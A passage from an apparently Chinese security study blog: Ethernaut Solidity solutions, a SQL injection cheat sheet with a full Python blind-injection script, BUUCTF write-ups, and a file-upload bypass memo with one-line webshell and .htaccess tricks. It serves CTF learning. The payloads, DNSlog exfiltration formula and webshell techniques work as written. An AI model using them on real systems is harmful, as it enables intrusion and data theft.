解：在Solidity里面，有个很特殊的自毁函数 selfdestruct(addr);随便写个合约，塞进去一个selfdestruct函数，然后指向题目 7.Vault合约代码123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } }} 解直接getStorageAt就行了，直接看 8.King合约代码12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; }} 解：1234567891011contract Attack { constructor(address payable target) public payable{ require(msg.value == 0.15 ether,&quot;Not enough!&quot;); target.call.gas(1000000).value(0.15 ether)(&quot;&quot;); } receive() external payable { revert(); }} 当submit题目打算回收“王权”时，它运行到king.transfer(msg.value);这一行时，由于king就是我们合约的地址，而我们合约的receive函数会执行revert，因此它会卡在这个状态无法执行，从而无法取回王权。 这个漏洞在实际合约中被用revert来执行DDos，让程序卡在某个状态无法运行。 麻了，在写攻击合约的时候又踩坑里了https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/ transfer:要求接收的智能合约中必须有一个fallback或者receive函数，否则会抛出一个错误(error)，并且revert（也就是回滚到交易前的状态）。而且有单笔交易中的操作总gas不能超过2300的限制。transfer函数会在以下两种情况抛出错误： 付款方合约的余额不足，小于所要发送的value 接收方合约拒绝接收支付 send:和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。 call: call函数和上面最大的区别在于，它没有gas的限制，使用call时EVM将所有gas转移到接收合约上，形式如下: (bool success, bytes memory data) = receivingAddress.call{value: 100}(“”); 将参数设置为空会触发接收合约的fallback函数，使用call同样也可以调用本合约内的函数，形式如下 (bool sent, bytes memory data) = _to.call{gas :10000, value: msg.value}(byte4(keccack256(“function_name(uint256)”,args))); 9.Re-entrancy合约代码123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Reentrance { using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;); if(result) { _amount; } balances[msg.sender] -= _amount; } } receive() external payable {}} 解合约在进行提币时，使用 require 依次判断提币账户是否拥有相应的资产，随后使用 msg.sender.call.value(amount)() 来发送 Ether，处理完成后相应修改用户资产数据。 首先，使用call进行转账是个比较危险的操作，因为call会将当前剩下的gas一并发过去执行","link":"/2022/10/04/solidity/"},{"title":"SQL注入备忘录","text":"最近在用sql-lib学sql注入，零零散散的笔记整了一大堆，现在整合一下，做个备忘录，方便比赛的时候方便查询。 典中典版本:爆库版本: ?id=-1' union select 1,database(),3--+爆库: ?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆表: ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='数据库'#爆字段: ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='数据表'#这几个出来了，剩下的就不用我说了吧qwq 常用函数: 名称 作用 system_user() 系统用户名 user() 用户名 session_user() 连接数据库的用户名 database() 数据库名 version() MYSQL数据库版本 load_file() MYSQL读取本地文件的函数 @@datadir 读取数据库路径 @@basedir MYSQL 安装路径 @@version_compile_os 操作系统 报错注入:extractvalue函数都会，不解释了。公式:extractvalue(数字,concat(0x7e,(查询语句),0x7e)) updatexml函数都会，不解释了。公式:updatexml(数字,concat(0x7e,(查询语句),0x7e),数字) 溢出报错exp函数溢出 | mysql&gt;5.5.53原理:当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误,用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出。 1234567891011mysql&gt; select ~(select version());+----------------------+| ~(select version()) |+----------------------+| 18446744073709551610 |+----------------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select exp(~(select * from(select version())x));ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.44-0ubuntu0.14.04.1' from dual)))'mysql&gt; 公式:select exp(~(select * from(查询语句)x));支持load_file,最多13行 BIGINT溢出差不多同样的原理，可以报错公式:select 1+~(select*from(查询语句)x);同理，其他的函数也可以这么干: 123select !atan((select*from(查询语句)a))-~0;select !ceil((select*from(查询语句)a))-~0;select !floor((select*from(查询语句)a))-~0; 其他能利用的函数… 12345678910111213HEXINFLOORCEILRANDCEILINGTRUNCATETANSQRTROUNDSIGNEXP... group by 注入 | 表中的数据至少要为三条才可以注入成功原理:group_by注入 公式:select count(*) from information_schema.tables group by concat((查询语句),floor(rand()*2));效率比较低qwq而且还有猜错的可能 无select注入 | MySQL 8浅谈利用mysql8新特性进行SQL注入脚本搬到这里了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203'''@author qwzf@desc 本脚本是用于mysql 8新特性的sql注入@date 2021/02/18'''import requestsimport stringurl = 'http://121.41.231.75:8002/Less-8/?id='chars=string.ascii_letters+string.digits+&quot;@{}_-?&quot;def current_db(url): print(&quot;利用mysql8新特性或普通布尔盲注:\\n1.新特性(联合查询) 2.普通布尔盲注&quot;) print(&quot;请输入序号:&quot;,end='') num = int(input()) if num == 1: payload = &quot;-1' union values row(1,database(),3)--+&quot; #联合查询爆当前数据库(可修改) urls = url + payload r = requests.get(url=urls) print(r.text) else: name='' payload = &quot;1' and ascii(substr((database()),{0},1))={1}--+&quot; #布尔盲注爆当前数据库(可修改) for i in range(1,40): char='' for j in chars: payloads = payload.format(i,ord(j)) urls = url + payloads r = requests.get(url=urls) if &quot;You are in&quot; in r.text: name += j print(name) char = j break if char == '': breakdef str2hex(name): res = '' for i in name: res += hex(ord(i)) res = '0x' + res.replace('0x','') return resdef dbs(url): #无列名盲注爆所有数据库(可修改) while True: print(&quot;请输入要爆第几个数据库，如：1,2等:&quot;,end='') x = int(input())-1 num = str(x) if x &lt; 0: break payload = &quot;1' and ('def',{},'',4,5,6)&gt;(table information_schema.schemata limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef tables_n(url,database): #无列名盲注爆数据表开始行数(可修改) payload = &quot;1' and ('def','&quot;+database+&quot;','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit {},1)--+&quot; for i in range(0,10000): payloads = payload.format(i) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: char = chr(ord(database[-1])+1) database = database[0:-1]+char payld = &quot;1' and ('def','&quot;+database+&quot;','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;+str(i)+&quot;,1)--+&quot; urls = url + payld res = requests.get(url=urls) #print(i) if 'You are in' not in res.text: print('从第',i,'行开始爆数据表') #判断开始行数 n = i break return ndef tables(url,database,n): #无列名盲注爆数据表(可修改) while True: print(&quot;请输入要爆第几个数据表，如：1,2等:&quot;,end='') x = int(input())-1 num = str(x + n) if x &lt; 0: break payload = &quot;1' and ('def','&quot;+database+&quot;',{},'',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef columns_n(url,database,table): #无列名盲注爆字段开始行数(可修改) payload = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit {},1)--+&quot; for i in range(3000,10000): payloads = payload.format(i) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: char = chr(ord(table[-1])+1) table = table[0:-1]+char payld = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;+str(i)+&quot;,1)--+&quot; urls = url + payld res = requests.get(url=urls) #print(i) if 'You are in' not in res.text: print('从第',i,'行开始爆字段') #判断开始行数 n = i break return ndef columns(url,database,table,n): #无列名盲注爆字段值(可修改) while True: print(&quot;请输入要爆第几个字段，如：1,2等:&quot;,end='') x = int(input())-1 num = str(x + n) if x &lt; 0: break payload = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;',{},'',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef datas(url,table): #无列名盲注爆数据(可修改) while True: print(&quot;请输入要爆第几个数据，如：1,2等:&quot;,end='') x = int(input()) y = x-1 num = str(y) if y &lt; 0: break payload = &quot;1' and (&quot;+str(x)+&quot;,{},'')&gt;(table &quot;+table+&quot; limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakif __name__ == &quot;__main__&quot;: while True: print(&quot;请输入要操作的内容：\\n1.爆当前数据库\\n2.爆数据表开始行号\\n3.爆数据表\\n4.爆字段值开始行号\\n5.爆字段值\\n6.爆数据\\n7.爆所有数据库&quot;) types = int(input()) if types == 1: current_db(url) elif types == 2 or types == 3: print(&quot;请输入已经得到的数据库名:&quot;,end='') database = input() if types == 2: tables_n(url,database) elif types == 3: print(&quot;爆数据表开始行号:&quot;,end='') n = int(input()) tables(url,database,n) elif types == 4 or types == 5: print(&quot;请输入已经得到的数据库名:&quot;,end='') database = input() print(&quot;请输入已经得到的数据表名:&quot;,end='') table = input() if types == 4: columns_n(url,database,table) elif types == 5: print(&quot;爆字段值开始行号:&quot;,end='') n = int(input()) columns(url,database,table,n) elif types == 6: print(&quot;请输入要查询的数据表名:&quot;,end='') table = input() datas(url,table) else: dbs(url) 时间盲注原理都会，不讲了。 ascii判断:if(ascii(substr(查询语句,1,1))&gt;115,1,sleep(3))left语句判断:if(left(查询语句,1)='s',sleep(10),1) if(left(查询语句,2)='sa',sleep(10),1)substring函数判断:if(substring((查询语句),1,1='a'),11111,sleep(1)) 布尔注入同时间盲注，没啥东西 二次注入也没啥太多活能整，可以使用flask框架本地中转一下，把繁琐的步骤交给机器做。 堆叠注入能同时执行多条语句，要求比较高，这时候可以使用预编译了。可以参考这题整花活**[强网杯 2019]随便注**BUUCTF[强网杯 2019]随便注 的三种解法 Dnslog注入要求mysql权限比较高，同时还得能出网公式:select load_file(concat('\\\\',(查询语句),'.DNSLOG给的域名/任意字符' 搜索注入原理:mysql查询的时候，常用的是select * from sqltest where names like '%要查询的关键字%这时候就可以闭合%然后注入 宽字节注入 |使用了addslashes()函数 &amp;&amp; 数据库设置了编码模式为GBK原理: 前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞。 12345?id=%df' and 1=1 --+?id=%df' and 1=2 --+?id=-1%df' union select 1,2,3 %23 limit注入 | 数据库版本比较低原理:Mysql下Limit注入方法公式:SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,查询语句)),1); Bypass空格两个空格代替一个空格，用Tab代替空格，%a0=空格,括号代替空格,注释/*注释*/ 引号 | 十六进制这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了： select column_name from information_schema.tables where table_name=0x7573657273 逗号在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2# 等价于 union select * from (select 1)a join (select 2)b 使用like: select ascii(mid(user(),1,1))=80 # 等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 绕过比较符号()（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）： 使用greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句： select * from users where id=1 and ascii(substr(database(),0,1))&gt;64 此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句: select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 Between注入主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常 注between 1 and 1; 等价于 =1 WHERE可以使用having ,但是having只能用前面select已经选择的列名 12select goods_price,goods_name from sw_goods where goods_price &gt; 100select goods_price,goods_name from sw_goods having goods_price &gt; 100 过滤information_schema可以查表名: InnoDb引擎从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。只需要把infromation_schema换成mysql.innodb_table_stats sys数据库在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。只需要把information_schema换成sys.schema_auto_increment_columns就行了，其他的完全一样 之后就需要无列名注入了 SLEEP睡不了？就想办法让sql干重活慢下来concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b' or and xor not绕过：and=&amp;&amp; or=|| xor=| not=! 绕过注释符（#，–(后面跟一个空格））过滤： id=1' union select 1,2,3||'1 最后的or ‘1闭合查询语句的最后的单引号，或者： id=1' union select 1,2,'3 绕过等于号使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; 其他的bypass手段:这个就看题目环境了，题目里随机多样，但是万变不离其宗。 Sqlmap科技未完待续 相关链接:Sqli通关flask框架exp函数溢出注入MySQL注入指北group_by注入group_by报错注入BIGINT报错注入SQL注入关联分析浅谈利用mysql8新特性进行SQL注入SQL注入之无列名注入","link":"/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"BUU做题寄录","text":"[suctf 2019]EasySQL | sql_modesql 注入 乍一试，可以堆叠 看样子有过滤,简单测了一下，过滤了from,information 黑名单 1$BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;; 查询语句 1select $_GET['query'] || flag from flag 脑洞:1234payload1: *,1payload2: 0;set sql_mode=PIPES_AS_CONCAT;select 0让sql把 || 当作拼接 [强网杯 2019]随便注 | 堆叠，无select 预编译上来就把黑名单一摆，好像已经无懈可击了 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 测试一下，字符形 双引号emmm,啥都不会了，只能看看wp了 mysql里面，爆字段并不一定需要information_schema这个库 12345678910mysql&gt; show columns from users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(20) | NO | | NULL | || password | varchar(20) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.00 sec) 嗯哼~how 命令查看表中的「字段」，注意表名要用反引号包裹有用 附: MySQL专有无select可用MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。 也可以使用预编译转换成hex绕过 [SUCTF 2019]EasySQL喜提fuzz脚本 12345678910import requests url = &quot;http://7e692c90-6f0b-4aa3-babf-89bb436f6b4f.node4.buuoj.cn:81/&quot;with open('sql-fuzz.txt') as f: for line in f: data = {&quot;query&quot;: line} r = requests.post(url,data=data) if('Nonono' in r.text): print(line.strip(),end=&quot; &quot;) 纯盲注了，啥都看不见，但是我感觉这题的画风是那么的似曾相识….. 1;set sql_mode=PIPES_AS_CONCAT;select 1 淦，上一题一模一样的payload [极客大挑战 2019]LoveSQL报错注入 http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin' and updatexml(0x7e,concat(0x7e,database()),0x7e) %23&amp;password=admin’ and sleep(3) 表名: 12geekuser: id,username,password geek库l0ve1ysq1: id,username,password geek库 admin824fc00cd6f8cd94403b365a80bcfbd cl4ywo_tai_nan_le glzjinglzjin_wants_a_girlfriend Z4cHAr7zCrbiao_ge_dddd_hm 报错注入，硬爆 123http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin' and updatexml(1,concat(0x7e,(select substr((select password from l0ve1ysq1 where username='flag'),30,16)),0x7e),1) %23&amp;password=admin' and sleep(3) [BJDCTF2020]Easy MD5一眼丁真ffifdyop 绕过中一个奇妙的字符串 经过md5加密后：276f722736c95d99e921722cf9ed621c 再转换为字符串：'or'6&lt;乱码&gt; 即 'or'66�]��!r,��b 用途： select * from admin where password=''or'6&lt;乱码&gt;' 就相当于select * from admin where password=''or 1 实现sql注入 [极客大挑战 2019]BuyFlag简单，新手村难度cookie + 传参 +PHP特性 [HCTF 2018]admin[护网杯 2018]easy_tornado随便点了一个文件，发现了这个传参 http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=a7b1991d198deda606020048ccd83bee 根据hints.txt发现了md5(cookie_secret+md5(filename)) cookie_secret这玩意到底是个啥，俺不知道，肯定没法破解 不过阴差阳错访问到了这个 http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=2 看样子是python沙箱逃逸了,简单fuzz一下，透心凉，心飞扬 搜索一下， http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg= {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '6dcbf553-b18a-46ba-9487-8cf74e2c43ca'}","link":"/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/"},{"title":"文件上传备忘录","text":"0x01 文件上传-前端拦截 | 懂得都懂，前端拦截=无效操作js检查代码12345678910111213141516171819//upload-labs level1function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; }} 传个正常图，然后抓包修改就行了。 0x02 文件上传-后端校验MINE | 懂的都懂，还是无效操作只校验MIME1$_FILES['upload_file']['type'] == 'image/jpeg') 无效操作，直接修改就完事了 常见MIMETYPE audio/mpeg -&gt; .mp3 application/msword -&gt; .doc application/octet-stream -&gt; .exe application/pdf -&gt; .pdf application/x-javascript -&gt; .js application/x-rar -&gt; .rar application/zip -&gt; .zip image/gif -&gt; .gif image/jpeg -&gt; .jpg / .jpeg image/png -&gt; .png text/plain -&gt; .txt text/html -&gt; .html video/mp4 -&gt; .mp4 0x03 文件上传-扩展名校验 | 你这waf保熟吗？姿势1: 黑名单校验，但黑名单不全其他后缀:*.php、*.php3、*.php4、*.PHP、*.phtml、*.pht 姿势2: 白名单校验，但是有解析漏洞截断绕过 /?upload=shell.php%00.jpg -&gt; /?upload=shell.php 解析漏洞Apache服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件 AddType application/x-httpd-php .php .phtml 在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。 例如：shell.php.qwe.asd -&gt;shell.php NginxNginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置SCRIPT_FILENAME。当访问www.xxx.com/phpinfo.jpg/1.php这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。 原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。 形式： www.xxxx.com/UploadFiles/image/1.jpg/1.php www.xxxx.com/UploadFiles/image/1.jpg%00.php www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php 另一种方法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 0x04 文件上传-内容检测 | 这文件要是有长有短，我直接吃了它1.magic number | 你不劈开这文件咋知道它熟不熟啊 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。 1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) 2.过滤&lt;?以及php @eval($_POST[cmd]); //需要php.ini开启短标签 3.正则替换老生常谈，双写 or 其他 4.二次渲染 | 你TM劈我文件是吧对渲染/加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。对二次渲染的攻击方式就是攻击文件加载器自身 0x05文件上传-配置文件 | 看，吸铁石.htaccess只是适用于apache，如果变成niginx或者iis则不会被解析文件上传漏洞之.htaccess .htaccess文件（“分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令将受到限制。管理员可以通过Apache的AllowOverride指令来设置。 具体实现： 1、上传.htaccess文件至服务器上传目录，此时apache在解析该目录下的php时将按照文件要求。只要文件名匹配到所定义的字符串，就会将该文件当作php解析。 123&lt;FilesMatch &quot;shana&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 2、上传.htaccess文件设置的关键字的文件名，即上传一个黑名单没有过滤的随意后缀名文件，但文件名中一定要包含shana，如”shana.jpg”，内容为一句话木马。此时”shana.jpg”会被Apache当作php解析。 .user.ini很通用 1234//.user.iniGIF89aauto_prepend_file=xxx 会自动包含xxx 系统特性仅适用windows平台windows 系统会自动删 源码一开天地灭，选择视窗保平安 0x06 文件上传-条件竞争 | 你是故意来找猹？文件能传，但是传进去后就给你删了，通常情况下需要一边传一边访问,或者利用环境，让php迟一点删文件 0x07 文件上传-解压报错 | 你这压缩包是金子做的还是文件是金子做的这种情况要求比较高了，需要后端解压压缩包Dest0g3 520迎新赛 ezip原理:创建一个解压到一半会报错的文件，然后遗留shell文件getshell 0x08 文件上传-软连接传快捷方式进去，离谱 要求后端会解压文件 ln -s /flag flag zip -y flag.zip flag NaN upload-exp 这里放一些常用的文件上传，会继续更新1.前端文件上传1234&lt;form id=&quot;upload-form&quot; action=&quot;目标网站&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;&lt;/form&gt; 后端接收代码 123456789101112131415161718if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; }}?&gt; **注:**前端的&lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt;中name=upload_file对应后端代码的$_FILES['upload_file'],前端的&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;中name=&quot;submit&quot;对应后端代码的isset($_POST['submit']),实战环境中还是需要对具体环境进行一些修改 2. .htaccess文件1234567&lt;FilesMatch &quot;shana&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;或者AddType application/x-httpd-php .png 3. .user.ini文件1auto_prepend_file=xxx 鲁棒性非常好，甚至可以 12GIF89aauto_prepend_file=xxx 自动包含xxx Refence:狼组安全团队公开知识库 upload-labs通关攻略文件上传总结文件上传漏洞之.htaccess.user.ini导致文件上传绕过","link":"/2022/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"SQL注入学习寄录","text":"0x01 SQLSQL 是一种标准SQL 是一门 ANSI（American National Standards Institute 美国国家标准化组织）标准的计算机语言，但是仍然存在着多种不同版本的 SQL 语言。 库&amp;表一个数据库通常包括一个或多个表。每个表都有一个名字标识，表包含带有数据的记录。 SQL 基础语法最简单的查询SELECT * FROM 表名 这个语句会把当前表下所有的数据全都列出来，在数据量比较小的时候会很好用，但当数据量特别大的时候就容易被一堆数据淹没，不知所措。 这时候可以添加限制，指定我要哪一列的数据 SELECT 列名 FROM 表名 数据还是很多，可以添加WHERE来进行进一步限制 SELECT 列名 FROM 表名 WHERE 条件 如果需要将数据排序的话，可以用ORDER BY SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名 有时候，咱只想返回前几条数据，就可以加入LIMIT SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名 LIMIT 数字 SQL操作符WHERE 列名 LIKE 通配符 按照通配符匹配 通配符 描述 % 替代0个或多个字符 _ 替代1个字符 [charlist] 字符列中的任何单一字符 [^charlist] 或 [!charlist] 不在字符列中的任何单一字符 WHERE 列名 IN (‘值1’,’值2’) WHERE 列名 BETWEEN 值1 AND 值2; 联合查询SELECT 列名1,列名2… FROM table1 UNION SELECT 列名1,列名2… FROM table2; 注意:联合查询要求前后字段数相同，否则将会报错. 特殊的数据库information_schema摘自这里 在数据库里，有这样一个数据库information_schema，数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。 表名 功能 SCHEMATA 提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 TABLES 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS 供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS 提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES 给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES 给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES（表权限） 给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES（列权限） 